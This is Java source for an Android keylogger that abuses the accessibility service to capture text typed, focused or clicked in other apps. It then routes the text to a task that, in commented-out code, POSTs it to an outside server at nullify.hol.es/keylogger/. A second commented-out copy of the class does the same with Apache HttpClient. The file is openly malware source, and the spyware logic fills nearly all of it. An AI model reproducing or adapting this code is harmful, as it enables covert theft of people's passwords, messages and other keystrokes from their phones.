package com.bshu2.androidkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.AsyncTask;
import android.text.Editable;
import android.text.SpannableStringBuilder;
import android.text.TextWatcher;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.inputmethod.EditorInfo;
import android.widget.EditText;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;

import java.net.HttpURLConnection;
import java.net.URL;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;


public class Keylogger extends AccessibilityService {



        private class SendToServerTask extends AsyncTask<String, Void, String> {
            @Override
            protected String doInBackground(String... params) {

                Log.v("Keylogger", params[0]);

             /*   try {

                    String POST_URL = "http://nullify.hol.es/keylogger/";


                    URL url = new URL(POST_URL);
                    String str = "text=" +params[0];

                    HttpURLConnection con = (HttpURLConnection) url.openConnection();
                    con.setRequestMethod("POST");
                    con.setDoOutput(true);
                    con.getOutputStream().write(str.getBytes("UTF-8"));
                    con.getInputStream();

                } catch (Exception e) {

                    e.printStackTrace();
                } */
                return params[0];


            }


        }

        @Override
        public void onServiceConnected() {

            Log.d("Keylogger", "Starting service");

        }



        @Override
        public void onAccessibilityEvent(AccessibilityEvent event) {

            DateFormat df = new SimpleDateFormat("HH:mm:ss");
            String time = df.format(Calendar.getInstance().getTime());

            switch (event.getEventType()) {

                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                    String data = event.getText().toString();
                    SendToServerTask sendTask = new SendToServerTask();
                    //Editable ab = new SpannableStringBuilder(data.replace("Android", "hacked"));
                    sendTask.execute("<--TEXT-->" + data);

                    break;

                }
                case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                    String data = event.getText().toString();
                    SendToServerTask sendTask = new SendToServerTask();
                    sendTask.execute("<--FOCUSED-->" + data);
                    break;
                }
                case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                    String data = event.getText().toString();
                    SendToServerTask sendTask = new SendToServerTask();
                    sendTask.execute("<--CLICKED-->" + data);
                    break;
                }
                case AccessibilityEvent.TYPES_ALL_MASK: {
                    String data = event.getText().toString();
                    SendToServerTask sendTask = new SendToServerTask();
                    sendTask.execute("<--MASK-->" + data);
                    break;
                }
                case AccessibilityEvent.TYPE_TOUCH_INTERACTION_END: {
                    String data = event.getText().toString();
                    SendToServerTask sendTask = new SendToServerTask();
                    sendTask.execute("<--TYPE-->" + data);
                    break;
                }

                default:
                    break;
            }
        }

        @Override
        public void onInterrupt() {

        }
    }


    /*private class SendToServerTask extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {

            Log.d("Keylogger", params[0]);

            try {

                String url = "http://nullify.hol.es/keylogger/";

                HttpParams httpParameters = new BasicHttpParams();
                HttpConnectionParams.setConnectionTimeout(httpParameters, 5000);
                HttpConnectionParams.setSoTimeout(httpParameters, 5000);

                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(10);
                nameValuePairs.add(new BasicNameValuePair("text", params[0]));

                HttpClient client = new DefaultHttpClient(httpParameters);

                HttpPost post = new HttpPost(url);
                post.setEntity(new UrlEncodedFormEntity(nameValuePairs, "UTF-8"));


                client.execute(post);

                // return result;

            } catch (Exception e) {
                e.printStackTrace();
            }
            return params[0];

        }
    }


    @Override
    public void onServiceConnected() {

        Log.d("Keylogger", "Starting service");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        DateFormat df = new SimpleDateFormat("dd/MM/yyyy, HH:mm:ss z", Locale.US);
        String time = df.format(Calendar.getInstance().getTime());

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "<--TEXT-->" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "<--FOCUSED-->" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "<--CLICKED-->" + data);
                break;
            }
            case AccessibilityEvent.TYPES_ALL_MASK: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "<--MASK-->" + data);
                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {
        //nothing
    }
}  */
